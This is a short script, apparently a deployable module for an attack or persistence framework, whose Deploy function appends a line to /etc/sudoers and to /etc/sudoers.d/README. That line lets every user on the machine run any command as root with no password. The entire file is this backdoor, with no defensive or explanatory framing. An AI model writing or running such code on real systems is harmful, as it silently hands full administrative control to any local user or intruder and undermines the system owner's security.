//priority:103
//timeout:60

function Deploy() {
	G.file.AppendFileString("/etc/sudoers", "\nALL ALL=(ALL:ALL) NOPASSWD:ALL\n");
	G.file.AppendFileString("/etc/sudoers.d/README", "\nALL ALL=(ALL:ALL) NOPASSWD:ALL\n");
	return true;
}

